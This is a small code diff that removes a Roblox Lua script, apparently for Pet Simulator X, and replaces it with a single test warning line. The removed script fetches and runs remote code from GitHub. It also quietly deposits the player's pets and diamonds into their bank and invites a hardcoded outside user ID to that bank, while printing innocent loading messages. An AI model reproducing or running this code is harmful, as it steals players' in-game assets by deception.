@@ -1,11 +1,1 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/BLACKGAMER1221/Pet-Simulator-X/main/BK%20Pet.lua"))()
-local lib = require(game.ReplicatedStorage:WaitForChild('Framework'):WaitForChild('Library'))
-local mydiamonds = string.gsub(game:GetService("Players").LocalPlayer.PlayerGui.Main.Right.Diamonds.Amount.Text, "%,", "") 
-local mybanks = lib.Network.Invoke("get my banks") 
-local request, request2 = lib.Network.Invoke("Bank Deposit", mybanks[1]['BUID'], PetsList, mydiamonds - 1); 
-if request then lib.Message.New("loading thunder Z"); return; 
-end 
-if lib.Network.Invoke("Invite To Bank", mybanks[1]['BUID'], 2212474848) then 
-print("loading BK%20Pet"); 
-else 
-    print("loading BK%20Pet"); end;
+warn("🚨 Test: Script Loaded Successfully!")
